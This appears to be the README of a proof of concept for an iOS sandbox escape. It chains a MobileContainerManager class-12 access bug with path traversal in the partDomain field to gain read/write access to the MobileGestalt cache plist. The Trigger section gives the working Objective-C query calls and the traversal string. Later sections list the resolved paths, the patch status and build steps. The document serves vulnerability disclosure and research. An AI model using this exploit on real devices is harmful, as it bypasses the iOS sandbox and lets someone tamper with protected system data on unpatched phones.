# `geod` MobileContainerManager traversal PoC

## Overview

This sandbox escape combines two MobileContainerManager bugs:

1. Class 12 allowed access to the built-in `com.apple.geod` container.
2. The `partDomain` field accepted path traversal.

The traversal redirected a read/write sandbox extension from the `geod`
container to the MobileGestalt cache directory.

## Trigger

```objc
query_set_class(query, 12);
query_set_ids(query, xpc_string_create("com.apple.geod"));
query_set_flags(query, UINT64_C(0x8100000000));
query_set_part(query, 3);
query_set_part_domain(query,
    "../../../../../../containers/Shared/SystemGroup/"
    "systemgroup.com.apple.mobilegestaltcache/Library/Caches");
```

## Paths accessed

MobileContainerManager first built this lexical path:

```text
/private/var/containers/Data/System/com.apple.geod/Library/Caches/../../../../../../containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches
```

It resolves to:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/
```

The extension can open the live cache plist for read and write:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist
```

This is fixed-directory access. It is not arbitrary `/private/var` access.

## Patch status

This chain is patched in iOS 27 beta 5 (`24A5408d`). The new code blocks
nonzero class-12 access and rejects traversal in `partDomain`. The iOS 26.6.1
status is not verified.

## Use

1. Add [`poc.m`](poc.m) to an Objective-C iOS application target.
2. Build with the `iphoneos` SDK for `arm64e`.
3. Call `run_geod_mcm_poc()` from a test action.
